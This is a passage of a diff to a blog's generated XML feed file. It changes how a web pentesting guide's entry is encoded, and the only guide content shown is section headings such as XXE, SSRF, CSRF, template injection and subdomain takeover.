+&lt;h2 id=&quot;xxe&quot;&gt;XXE&lt;/h2&gt;
 
-<h2 id="ssrf">SSRF</h2>
-<h2 id="csrf">CSRF</h2>
-<h2 id="template-injection">Template injection</h2>
-<h2 id="subdomain-takeover">Subdomain Takeover</h2>]]></content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="web" /><category term="pentesting" /><summary type="html"><![CDATA[This is a guide for Web pentesting]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;h2 id=&quot;ssrf&quot;&gt;SSRF&lt;/h2&gt;
+&lt;h2 id=&quot;csrf&quot;&gt;CSRF&lt;/h2&gt;
+&lt;h2 id=&quot;template-injection&quot;&gt;Template injection&lt;/h2&gt;
+&lt;h2 id=&quot;subdomain-takeover&quot;&gt;Subdomain Takeover&lt;/h2&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="web" /><category term="pentesting" /><summary type="html">This is a guide for Web pentesting</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
